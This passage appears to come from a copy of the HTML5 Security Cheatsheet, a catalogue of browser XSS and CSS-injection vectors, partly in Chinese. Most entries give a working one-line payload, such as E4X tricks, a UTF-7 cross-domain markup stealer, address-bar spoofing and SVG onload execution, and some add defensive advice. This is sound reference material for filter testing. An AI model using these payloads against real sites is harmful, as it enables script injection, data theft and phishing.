<h3 id="Breaking_the_functional_notation_on_IE_(1)#92test">Breaking the functional notation on IE (1)<a href="#92">#92</a><a href="test/#92">test</a></h3><p>To break the functional notation on IE “url()” can be used combined with a following whitespace - then followed by any non-whitespace character. The following characters<em> are whitespaces: IE 6,7 standards mode: 9-13,32,160,8192-8203,12288,65279 IE 8 standards mode: 1-32,127 </em> These are given in decimal codes.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;background:url(http://foo.f/f oo/;color:red/*/foo.jpg);&#34;&#62;X&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>css</li>
<li>internet explorer</li>
<li>trick</li>
<li><p>notation</p>
</li>
<li><p><a href="#111">#111</a></p>
</li>
<li><a href="#112">#112</a></li>
<li><a href="#114">#114</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Multiple_CSS_“url()”_values_in_IE_6#93test">Multiple CSS “url()” values in IE 6<a href="#93">#93</a><a href="test/#93">test</a></h3><p>Internet Explorer supports multiple “url()” values all of which can contain payload. The delimiter between the “url()” values should be a whitespace character (“\x20” in the given example).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;list-style:url(http://foo.f)\20url(javascript:alert(1));&#34;&#62;X&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure in case the user is allowed to submit CSS it is being filtered and whitelisted correctly to avoid attacks via multiple backgrounds.</p>
<ul>
<li><p>internet explorer 6.0</p>
</li>
<li><p>xss</p>
</li>
<li>css</li>
<li>internet explorer</li>
<li>trick</li>
<li>url</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Style_injection_when_copying_innerHTML_(3)#98test">Style injection when copying innerHTML (3)<a href="#98">#98</a><a href="test/#98">test</a></h3><p>The example shows that Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div id=d&#62;&#60;div style=&#34;font-family:&#39;sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B&#39;&#34;&#62;X&#60;/div&#62;&#60;/div&#62; &#60;script&#62;with(document.getElementById(&#34;d&#34;))innerHTML=innerHTML&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p>Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it’s supposed to.</p>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>firefox 2.x</p>
</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>script</li>
<li>dom</li>
<li>innerhtml</li>
<li><p>css</p>
</li>
<li><p><a href="#59">#59</a></p>
</li>
<li><a href="#97">#97</a></li>
<li><a href="#128">#128</a></li>
</ul>
<p>reporter：sirdarckcat</p>
<h3 id="Using_comments_to_obfuscate_styles#99test">Using comments to obfuscate styles<a href="#99">#99</a><a href="test/#99">test</a></h3><p>As noted in CSS2.1 specification (and repeated in CSS3), comments may occur anywhere outside other tokens. The cases that are exceptions to this rule are a subject to special attention. First of all the CSS2.1 specification is inconsistent, since, for example, the “!important” token in his definition allows comments. Despite the exclusion this feature in CSS3, IE (8-9 standards mode) and Firefox 13 still support “!/<strong>/important”. You can find more obvious mistakes, for example, the same Firefox 13 allows “font-family: Ar/</strong>/ial”. Special interest are exceptions to this rule in IE. The first example shows the possibility for comments in the value of the property. The third example, in addition to demonstrating a similar possibility inside the “url()” function, is also an interesting case, when a comment can not be replaced by any other structure (another space or encoded space “\000020” will not give necessary effect). Typically these cases occur when the token does not match your precise definition. In this example token “url” can not contain a space character. Inside the &lt;STYLE&gt; tag, there are rules for parsing the SGML comment delimiters, that are allowed before and after statements regardless of the form (opening/closing) and nesting.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXX&#60;style&#62; *&#123;color:gre/**/en !/**/important&#125; /* IE 6-9 Standards mode */ &#60;!-- --&#62;&#60;!--*&#123;color:red&#125; /* all UA */ *&#123;background:url(xx:x //**/\red/*)&#125; /* IE 6-7 Standards mode */ &#60;/style&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest</p>
</li>
<li><p>firefox 3.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>trick</p>
</li>
<li>css</li>
<li>obfuscation</li>
<li>internet explorer</li>
<li>firefox</li>
<li>opera</li>
<li>chrome</li>
<li>safari</li>
<li><p>comment</p>
</li>
<li><p><a href="http://www.w3.org/TR/css3-syntax/#comments" target="_blank" rel="external">http://www.w3.org/TR/css3-syntax/#comments</a></p>
</li>
<li><a href="http://www.w3.org/TR/CSS2/syndata.html#uri" target="_blank" rel="external">http://www.w3.org/TR/CSS2/syndata.html#uri</a></li>
<li><a href="http://www.w3.org/TR/css3-syntax/#grammar0" target="_blank" rel="external">http://www.w3.org/TR/css3-syntax/#grammar0</a></li>
<li><a href="http://www.w3.org/TR/CSS2/grammar.html" target="_blank" rel="external">http://www.w3.org/TR/CSS2/grammar.html</a></li>
</ul>
<p>reporter：Roman Ivanov, LeverOne</p>
<h3 id="Breaking_the_functional_notation_on_Chrome_and_Safari_(2)#111test">Breaking the functional notation on Chrome and Safari (2)<a href="#111">#111</a><a href="test/#111">test</a></h3><p>To break the functional notation “url()” can be used in combination with the following characters<em>: [a] 1-8,10-31,127,9,32,40 Note that simultaneous breaking of functional notation and strings can be accomplished by the characters listed in #45. </em> Characters are given as decimal ASCII table index.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;background:url(/f#[a]oo/;color:red/*/foo.jpg);&#34;&#62;X&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>chrome 5.0</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>css</li>
<li>google chrome</li>
<li>safari</li>
<li>trick</li>
<li><p>notation</p>
</li>
<li><p><a href="#45">#45</a></p>
</li>
<li><a href="#92">#92</a></li>
<li><a href="#112">#112</a></li>
<li><a href="#114">#114</a></li>
</ul>
<p>reporter：LeverOne, .mario</p>
<h3 id="Breaking_the_functional_notation_on_IE_(3)#112test">Breaking the functional notation on IE (3)<a href="#112">#112</a><a href="test/#112">test</a></h3><p>If any<em> part of the CSS-declaration (property or value) contains a left curly brace ({ - not as part of a string), the CSS declaration cannot be closed without using a matching right curly brace (}). In most browsers this feature can not be used to bypass filters - as they require to close the strings, functions and attributes inside blocks. IE nevertheless does not require to close function inside such blocks. It is important to take into account especially when filtered styles are inside the targeted tag’s attribute. The example works up to IE 7 standards mode. </em>There’s another exception for IE (see the letters [a] and [b] of #60).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;font-family:foo&#123;bar;background:url(http://foo.f/oo&#125;;color:red/*/foo.jpg);&#34;&#62;X&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>css</li>
<li>internet explorer</li>
<li>trick</li>
<li><p>notation</p>
</li>
<li><p><a href="#46">#46</a></p>
</li>
<li><a href="#60">#60</a></li>
<li><a href="#92">#92</a></li>
<li><a href="#111">#111</a></li>
<li><a href="#114">#114</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Jump_into_the_selector_via_attribute_delimiters#113test">Jump into the selector via attribute delimiters<a href="#113">#113</a><a href="test/#113">test</a></h3><p>According to established practice selectors are usually filtered less thoroughly by filtering software than other parts of CSS language constructs. This example shows how to leave a CSS-block open to get hands on a selector and inject code into a possibly less thoroughly filtered area. On IE this example works in IE 8-9 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div id=&#34;x&#34;&#62;XXX&#60;/div&#62; &#60;style&#62; #x&#123;font-family:foo[bar;color:green;&#125; #y];color:red;&#123;&#125; &#60;/style&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 2.x</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.x</p>
</li>
<li><p>opera 12.0</p>
</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>css</li>
<li>firefox</li>
<li>opera</li>
<li>trick</li>
<li>selector</li>
<li><p>attribute</p>
</li>
<li><p><a href="#27">#27</a></p>
</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Breaking_the_functional_notation_on_Chrome_and_Safari_(4)#114test">Breaking the functional notation on Chrome and Safari (4)<a href="#114">#114</a><a href="test/#114">test</a></h3><p>The functional notation breaker shown in #111 also works with quoted strings for several CSS properties. The following characters can be used to break the string and create a new property-value pair: [a] Safari, Chrome 16↓: 1-8,10-31 and 127 Chrome 17↑: 10,12,13 (decimal ASCII table index)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;x style=&#34;background:url(&#39;x[a];color:red;/*&#39;)&#34;&#62;XXX&#60;/x&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>chrome 5.0</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>opera 15.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>xss</p>
</li>
<li>css</li>
<li>google chrome</li>
<li>safari</li>
<li>trick</li>
<li><p>notation</p>
</li>
<li><p><a href="#45">#45</a></p>
</li>
<li><a href="#92">#92</a></li>
<li><a href="#111">#111</a></li>
<li><a href="#112">#112</a></li>
</ul>
<p>reporter：.mario, LeverOne</p>
<h2 id="纯javascript的向量">纯javascript的向量</h2><h3 id="基于Firefox_setter执行Javascript#6test">基于Firefox setter执行Javascript<a href="#6">#6</a><a href="test/#6">test</a></h3><p>在Gecko/Firefox里可以使用setter间接调用Javascript函数,而不需要括号.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62;(&#123;set/**/$($)&#123;_/**/setter=$,_=1&#125;&#125;).$=alert&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 1.x</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>dom</li>
<li>firefox</li>
<li>setter</li>
<li><p>proprietary</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters" target="_blank" rel="external">https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="使用sharp_variables执行Javascript#15test">使用sharp variables执行Javascript<a href="#15">#15</a><a href="test/#15">test</a></h3><p>这个向量展示了sharp variables和循环引用能用与做混淆和隐式执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62;(&#123;0:#0=alert/#0#/#0#(0)&#125;)&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 2.x</li>
<li><p>firefox 11.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>firefox</li>
<li>sharp</li>
<li><p>proprietary</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/Sharp_variables_in_JavaScript" target="_blank" rel="external">https://developer.mozilla.org/en/Sharp_variables_in_JavaScript</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="通过覆盖ReferenceError对象执行Javascript#20test">通过覆盖ReferenceError对象执行Javascript<a href="#20">#20</a><a href="test/#20">test</a></h3><p>这个Javascript向量展示了如何覆盖ReferenceError对象,并引起错误,从而导致Javascript执行.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62;ReferenceError.prototype.__defineGetter__(&#39;name&#39;, function()&#123;alert(1)&#125;),x&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p>在用户可以注入脚本的情况下不要相信DOM,即便是DOM属性的访问.</p>
<ul>
<li>opera 8.x</li>
<li><p>opera 11.01</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox 15.0</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome 9.0</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari 5.1.7</p>
</li>
<li><p>javascript</p>
</li>
<li>opera</li>
<li>firefox</li>
<li>chrome</li>
<li>safari</li>
<li>ReferenceError</li>
<li><p>overwrite</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Functions/ReferenceError" target="_blank" rel="external">https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Functions/ReferenceError</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="通过私有属性_noSuchMethod执行Javascript#21test">通过私有属性 <strong>noSuchMethod</strong>执行Javascript<a href="#21">#21</a><a href="test/#21">test</a></h3><p>Firefox支持非标准的属性 <strong>noSuchMethod</strong> ,它可以使我们在访问一个对象不存在的方法时自动拦截.我们可以利用它执行Javascript而不需要使用funtion(){…}这样的方法.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62;Object.__noSuchMethod__ = Function,[&#123;&#125;][0].constructor._(&#39;alert(1)&#39;)()&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 3.5</li>
<li><p>firefox latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>firefox</li>
<li><strong>noSuchMethod</strong></li>
<li><p>proprietary</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/noSuchMethod" target="_blank" rel="external">https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/noSuchMethod</a></p>
</li>
</ul>
<p>reporter：Gareth, .mario</p>
<h3 id="Spoofing_the_address_bar_information_with_history-replaceState()#103test">Spoofing the address bar information with history.replaceState()<a href="#103">#103</a><a href="test/#103">test</a></h3><p>The history.pushState() and history.replaceState() API allows to create and modify the user’s history. An attacker can use this feature to change the information displayed in the address bar as well as the location DOM object and thus initiate phishing attacks or obfuscate bad intentions. While pushState adds a new history entry, replaceState modifies the current one. This removes nearly all traces of the actual location from the browsing history giving no possibility to navigate back. The information shown in the address bar cannot be trusted anymore as soon as an attacker or a malicious website execute JavaScript.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62;history.pushState(0,0,&#39;/i/am/somewhere_else&#39;);&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 4.0</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 6.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>opera 11.50</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>spoofing</li>
<li>history</li>
<li><p>phishing</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/history.html" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/history.html</a></p>
</li>
</ul>
<p>reporter：.mario, freddyb</p>
<h3 id="Executing_JavaScript_using_ES6_Template_Strings#140test">Executing JavaScript using ES6 Template Strings<a href="#140">#140</a><a href="test/#140">test</a></h3><p>ES6 specifies a new language feature called “Template Strings” (often also referred to as “Quasi Literals” alongside multi-line strings and others). This allows to execute arbitrary JavaScript code without using parenthesis but back-ticks instead. Inside back-tick delimited strings, placeholders such as ${} can wrap executable code.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62; alert`1`; var something = `abc$&#123;alert(1)&#125;def`; ``.constructor.constructor`alert\`1\````; &#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure that your IDS, filter and other protective systems are aware of the fact, that back-ticks (U+0060) are now capable of initiating execution of methods and functions in JavaScript. Further make sure, that symbols such as ${} cannot be injected into existing template and multi-line strings.</p>
<ul>
<li>firefox 34.0</li>
<li><p>firefox latest</p>
</li>
<li><p>es6</p>
</li>
<li>javascript</li>
<li>backtick</li>
<li><p>template</p>
</li>
<li><p><a href="http://tc39wiki.calculist.org/es6/template-strings/" target="_blank" rel="external">http://tc39wiki.calculist.org/es6/template-strings/</a></p>
</li>
<li><a href="https://html5sec.org/es6/template" target="_blank" rel="external">https://html5sec.org/es6/template</a></li>
<li><a href="http://wiki.ecmascript.org/doku.php?id=harmony:quasis" target="_blank" rel="external">http://wiki.ecmascript.org/doku.php?id=harmony:quasis</a></li>
</ul>
<p>reporter：.mario</p>
<h2 id="E4X向量">E4X向量</h2><h3 id="Self-including_E4X-based_JavaScript_snippet#25test">Self-including E4X-based JavaScript snippet<a href="#25">#25</a><a href="test/#25">test</a></h3><p>This &lt;SCRIPT&gt; tag tries to include the very same page it is being executed from - and then executes the {}-delimited E4X payload. To avoid having Firefox throw an error during inclusion the ending sequence ;0 is necessary.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script src=&#34;#&#34;&#62;&#123;alert(1)&#125;&#60;/script&#62;;1</span><br></pre></td></tr></table></figure>
<p>E4X is extremely dangerous since any page can include sources providing valid XML and the mentioned semi-colon delimiter. For effective protection websites must be applied with a DOCTYPE - or contain invalid markup. There are many variations for the ending delimiter - as long it is valid JavaScript and not indicating the page is XML only it will work (;1, ,1, ._, etc..)</p>
<ul>
<li>firefox 1.5</li>
<li><p>firefox 16.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>firefox</li>
<li>e4x</li>
<li>self-inclusion</li>
<li><p>proprietary</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/E4X" target="_blank" rel="external">https://developer.mozilla.org/en/E4X</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="E4X-based_UTF-7_JavaScript/HTML_snippet_stealing_cross-domain_markup#26test">E4X-based UTF-7 JavaScript/HTML snippet stealing cross-domain markup<a href="#26">#26</a><a href="test/#26">test</a></h3><p>In case an attacker can inject the character sequence beginning with .toXMLString() it’s possible to include the victimized website in a &lt;SCRIPT&gt; tag loaded from an arbitrary page and steal the markup of the included page - across domain and protocol borders. Note that the whole vector is encoded in UTF-7. This is possible since the including &lt;SCRIPT&gt; tag can decide via charset attribute what charset to use.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);</span><br></pre></td></tr></table></figure>
<p>Make sure all sites are being applied with a defined charset like UTF-8. Also incoming data should be converted from UTF-7 before being escaped with htmlentities() or comparable methods. All websites containing sensitive data should be applied with a DOCTYPE.</p>
<ul>
<li>firefox 1.5</li>
<li><p>firefox 4.0.1</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>firefox</li>
<li>e4x</li>
<li>stealing</li>
<li>utf7</li>
<li><p>proprietary</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/E4X" target="_blank" rel="external">https://developer.mozilla.org/en/E4X</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="E4X_used_to_close_an_opening_&lt;SCRIPT&gt;_tag_and_create_an_E4X_object_at_the_same_time#58test">E4X used to close an opening &lt;SCRIPT&gt; tag and create an E4X object at the same time<a href="#58">#58</a><a href="test/#58">test</a></h3><p>This one is tricky. Firefox allows to end an opening &lt;SCRIPT&gt; tag with a new E4X object (&lt;b/&gt;) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional &lt; introduces a size comparison (&lt;b/&gt; &lt; alert(1)).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;b&#62;&#60;script&#60;b&#62;&#60;/b&#62;&#60;alert(1)&#60;/script &#60;/b&#62;&#60;/b&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 1.5</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>e4x</li>
<li>script</li>
<li>parser</li>
<li><p>regex</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/E4X" target="_blank" rel="external">https://developer.mozilla.org/en/E4X</a></p>
</li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=564706" target="_blank" rel="external">https://bugzilla.mozilla.org/show_bug.cgi?id=564706</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="E4X_used_to_close_an_opening_&lt;SCRIPT&gt;_tag_and_{}_evaluation#75test">E4X used to close an opening &lt;SCRIPT&gt; tag and {} evaluation<a href="#75">#75</a><a href="test/#75">test</a></h3><p>In this example an E4X object is being used to close a half-open &lt;SCRIPT&gt; tag and evaluate code in the global scope afterwards via the E4X curly bracket delimiters. This technique will not work anymore as soon Firefox uses the already integrated HTML5 parser (html5.enable=true)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#60;&#123;alert(1)&#125;/&#62;&#60;/script &#60;/&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 1.5</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>e4x</li>
<li>script</li>
<li>parser</li>
<li><p>regex</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/E4X" target="_blank" rel="external">https://developer.mozilla.org/en/E4X</a></p>
</li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=564706" target="_blank" rel="external">https://bugzilla.mozilla.org/show_bug.cgi?id=564706</a></li>
</ul>
<p>reporter：.mario, Gareth</p>
<h2 id="DOM属性与方法的攻击向量">DOM属性与方法的攻击向量</h2><h3 id="通过DOM_Worker包含上下文本身进行XSS#4test">通过DOM Worker包含上下文本身进行XSS<a href="#4">#4</a><a href="test/#4">test</a></h3><p>这是一个self-including的例子,通过DOM worker包含上下文的方式触发事件引起脚本执行.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0?&#60;script&#62;Worker(&#34;#&#34;).onmessage=function(_)eval(_.data)&#60;/script&#62; :postMessage(importScripts(&#39;data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk&#39;))</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 3.5</li>
<li><p>firefox 15.0</p>
</li>
<li><p>xss</p>
</li>
<li>dom</li>
<li>firefox</li>
<li>worker</li>
<li>self-inclusion</li>
<li><p>e4x</p>
</li>
<li><p><a href="https://developer.mozilla.org/En/Using_web_workers" target="_blank" rel="external">https://developer.mozilla.org/En/Using_web_workers</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Firefox_crypto_对象_-_隐式eval()#5test">Firefox crypto 对象 - 隐式eval()<a href="#5">#5</a><a href="test/#5">test</a></h3><p>这个向量披露了火狐中crypto对象的一个隐式eval()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62;crypto.generateCRMFRequest(&#39;CN=0&#39;,0,0,null,&#39;alert(1)&#39;,384,null,&#39;rsa-dual-use&#39;)&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 2.x</li>
<li><p>firefox 34.0</p>
</li>
<li><p>xss</p>
</li>
<li>dom</li>
<li>firefox</li>
<li>crypto</li>
<li>eval</li>
<li>csp</li>
<li><p>proprietary</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/JavaScript_crypto" target="_blank" rel="external">https://developer.mozilla.org/en/JavaScript_crypto</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h2 id="基于JSON的向量">基于JSON的向量</h2><h3 id="Self-hijacking_JSON_literals#54test">Self-hijacking JSON literals<a href="#54">#54</a><a href="test/#54">test</a></h3><p>In case parts of a JSON literal are controlled by user input there’s a risk to allow auto-harvesting values from later object members.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62;[&#123;&#39;a&#39;:Object.prototype.__defineSetter__(&#39;b&#39;,function()&#123;alert(arguments[0])&#125;),&#39;b&#39;:[&#39;secret&#39;]&#125;]&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.0</li>
<li><p>opera 10.10</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome 6.0</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox 3.0.19</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>json</li>
<li><strong>definesetter</strong></li>
<li>object</li>
<li>prototype</li>
</ul>
<p>reporter：.mario</p>
<h2 id="SVG内的向量">SVG内的向量</h2><h3 id="通过SVG中G标签的onload属性执行Javascript#11test">通过SVG中G标签的onload属性执行Javascript<a href="#11">#11</a><a href="test/#11">test</a></h3><p>SVG文件中可以通过任意元素的onload事件执行Javascript,且不需要用户交互</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62;&#60;g onload=&#34;javascript:alert(1)&#34;&#62;&#60;/g&#62;&#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<p>在上传时不能把SVG当图片处理,因为它可以包含任意HTML,且能被浏览器解析</p>
<ul>
<li>opera 10.0</li>
<li><p>opera 12.0</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome 35.0</p>
</li>
<li><p>firefox 3.0</p>
</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari 5.1.7</p>
</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>onload</li>
<li>opera</li>
<li>firefox</li>
<li>chrome</li>
<li><p>internet explorer</p>
</li>
<li><p><a href="https://developer.mozilla.org/en/SVG" target="_blank" rel="external">https://developer.mozilla.org/en/SVG</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Opera_10_SVG_font_XSS#43test">Opera 10 SVG font XSS<a href="#43">#43</a><a href="test/#43">test</a></h3><p>Opera 10.00 and later minor versions allow using SVG fonts and will - as soon as the font file has loaded even execute embedded JavaScript. The current example utilizes a load event handler to execute the JavaScript without user interaction as soon as the font file has been fully loaded.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&#62; &#60;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&#62; &#60;head&#62; &#60;style type=&#34;text/css&#34;&#62; @font-face &#123;font-family: y; src: url(&#34;font.svg#x&#34;) format(&#34;svg&#34;);&#125; body &#123;font: 100px &#34;y&#34;;&#125; &#60;/style&#62; &#60;/head&#62; &#60;body&#62;Hello&#60;/body&#62; &#60;/html&#62;``&#60;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&#62;&#60;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&#62;&#60;svg onload=&#34;alert(1)&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62;&#60;defs&#62;&#60;font id=&#34;x&#34;&#62;&#60;font-face font-family=&#34;y&#34;/&#62;&#60;/font&#62;&#60;/defs&#62;&#60;/svg&#62;required_mime: image/svg+xmlcrossdomain: 0path: [http://html5sec.org/font.svg](http://html5sec.org/font.svg)name: font.svg</span><br></pre></td></tr></table></figure>
<ul>
<li><p>opera 10.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>svg</li>
<li>font</li>
<li>svgfont</li>
</ul>
<p>reporter：.mario</p>
